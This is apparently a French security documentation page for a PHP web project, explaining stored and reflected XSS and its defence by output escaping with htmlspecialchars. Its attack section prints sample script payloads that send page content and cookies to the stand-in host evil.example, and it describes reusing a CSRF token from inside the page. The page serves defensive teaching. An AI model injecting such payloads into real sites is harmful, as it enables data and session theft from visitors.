# XSS

Une faille XSS survient quand une donnée fournie par un utilisateur (pseudo,
commentaire, e-mail…) est renvoyée dans une page sans échappement : le
navigateur d'un autre visiteur l'interprète comme du HTML ou du JavaScript.

Défense du projet : échappement **au moment de l'affichage**, dans les vues,
avec `htmlspecialchars`. La donnée est stockée telle quelle ; elle est
neutralisée à chaque sortie.

## L'attaque sans échappement

Sur une version où un champ affiché n'est pas échappé (ici : un commentaire de
la galerie), le déroulé d'une XSS **stockée** est le suivant.

1. L'attaquant poste un « commentaire » qui contient du code au lieu de texte :

   ```html
   Super montage !<script>
     fetch('https://evil.example/vol?d=' + encodeURIComponent(document.body.innerHTML))
   </script>
   ```

2. Sans `htmlspecialchars`, le serveur stocke la chaîne telle quelle et la
   réinsère dans le HTML à **chaque** affichage de la galerie.

3. Quand une victime ouvre la galerie, son navigateur ne distingue pas ce script
   du code légitime de la page : il l'exécute, dans l'origine du site, avec la
   session de la victime.

4. Le script fait ce qu'il veut dans ce contexte. Ici il envoie le contenu de la
   page à `evil.example`. Il touche **tous** les visiteurs de la galerie, pas
   seulement l'attaquant.

Depuis cette position, il peut :

- exfiltrer le contenu de la page (données privées, e-mail, jetons du DOM) ;
- **agir au nom de la victime** : lire le champ `csrf_token` présent dans la page
  et soumettre un formulaire (`/photo/delete`, `/gallery/comment`…) — ce qui
  **contourne la protection CSRF**, puisque le jeton est lu de l'intérieur de la
  page, sans violer la *same-origin policy* ;
- rediriger, défigurer la page, enregistrer les frappes.

Variante **réfléchie** : au lieu d'être stocké, le code passe par un paramètre
d'URL renvoyé sans échappement ; l'attaquant piège alors la victime avec un lien.

Vol du cookie : un `<script>document.location='https://evil.example/?c='+document.cookie</script>`
donnerait la session sur un site sans protection. Ici le cookie est `HttpOnly`
(`Core/Session.php`), `document.cookie` ne le lit pas — l'attaque bascule donc
vers l'exfiltration et l'action au nom de la victime, la session restant
utilisable tant que le script tourne.

## Échappement en sortie

Toute valeur dynamique insérée dans le HTML passe par `htmlspecialchars` :

```php
<span><?= htmlspecialchars((string) $utilisateur['username']) ?></span>
```

`<`, `>`, `&` sont convertis en entités ; `<script>` s'affiche comme texte au
lieu de s'exécuter.

## Dans un attribut HTML

Un attribut peut être clos par un guillemet simple ou double : ajouter
`ENT_QUOTES` pour échapper les deux.

```php
<input value="<?= htmlspecialchars((string) $valeur, ENT_QUOTES) ?>">
```

Sans `ENT_QUOTES`, une valeur contenant `"` ferme l'attribut et permet d'en
injecter d'autres (`onmouseover=…`).

## Texte multi-ligne

Échapper **avant** de convertir les retours à la ligne, sinon le `<br>` ajouté
est lui-même échappé :

```php
<p><?= nl2br(htmlspecialchars((string) $commentaire['comment'])) ?></p>
```

## Contextes non couverts par `htmlspecialchars`

`htmlspecialchars` protège le corps HTML et les attributs. Il ne suffit pas si
une donnée est injectée :

- dans un `<script>` (contexte JavaScript) ;
- dans une URL `href`/`src` (un `javascript:…` reste exécutable) ;
- dans un gestionnaire d'événement (`onclick=…`) ;
- dans du CSS en ligne.

Règle : ne pas insérer de donnée utilisateur dans ces contextes. Une URL fournie
par l'utilisateur se valide (schéma `http`/`https` uniquement) avant affichage.

## Points d'attention

- **Échapper en sortie, pas en entrée.** La base garde la valeur brute ;
  l'échappement dépend du contexte d'affichage, donc il se fait à l'affichage.
  Échapper avant stockage corrompt la donnée et rate les autres contextes.
- **`charset=utf-8`** est déclaré dans `layout.php` : un jeu de caractères
  ambigu peut contourner l'échappement.
- **Pas de Content-Security-Policy** en place. Un en-tête CSP restreignant les
  sources de scripts limiterait l'impact d'une injection résiduelle (durcissement
  optionnel, non requis par le sujet).
